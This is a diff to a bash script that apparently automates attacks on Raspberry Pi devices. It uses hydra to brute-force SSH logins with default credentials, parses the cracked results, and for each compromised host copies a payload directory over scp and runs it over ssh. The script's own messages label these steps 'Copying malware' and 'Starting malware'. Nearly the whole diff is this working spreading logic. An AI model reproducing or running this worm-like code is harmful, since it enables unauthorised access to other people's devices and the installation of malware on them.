@@ -14,7 +14,8 @@ pass="raspberry"
 port="22"
 
 # Payload dir to send to the target PI
-PAYLOAD="./payload/"
+PAYLOAD="./client/"
+CLIENT_EXE="client/run"
 
 # ------------------
 # -- Send Payload --
@@ -33,7 +34,10 @@ function sendPayload() {
 
 	# TODO: Is $payload being escaped properly? 
 	# TODO: Sending payload to $HOME on the remote machine, is there a better place for it?
-	#sshpass -p "$4" scp -r "$PAYLOAD" "${3}@${1}:/home/${3}:${2}"
+	echo -n "Copying malware... " 
+	sshpass -p "$4" scp -P ${2} -r "$PAYLOAD" "${3}@${1}:/home/${3}"
+	echo -n "Starting malware... " 
+	sshpass -p "$4" ssh -P "${3}@${1}" "/home/${3}/${CLIENT_EXE}"
 }
 
 # -------------------
@@ -154,6 +158,25 @@ timestamp=`date +%Y-%m-%d_%H:%M:%S`
 logfile="hydraProbe_${timestamp}.txt"
 echo "hydra ${userString} ${passString} -o '${logfile}' -s ${port} ${target} ssh"
 hydra ${userString} ${passString} -o ${logfile} -s ${port} ${target} ssh
+
+echo ""
+
+
+# Now that we have our output file, we can being working on it.
+# Trash the first line of the file (information about the probe)
+sed -i '1d' ${logfile}
+while read line; do
+	# Go through each identified host of the probe, and send them the payload.
+	echo $line;
+
+	ip=`echo $line | awk '{print $3}'`
+	port=`echo $line | cut -d \[ -f 2 | cut -d \] -f 1`
+	user=`echo $line | awk '{print $5}'`
+	pass=`echo $line | awk '{print $7}'`
+
+	echo "sendPayload ${ip} ${port} ${user} ${pass}"
+	sendPayload ${ip} ${port} ${user} ${pass}
+done < ${logfile}
 
 
 # -- Todo --
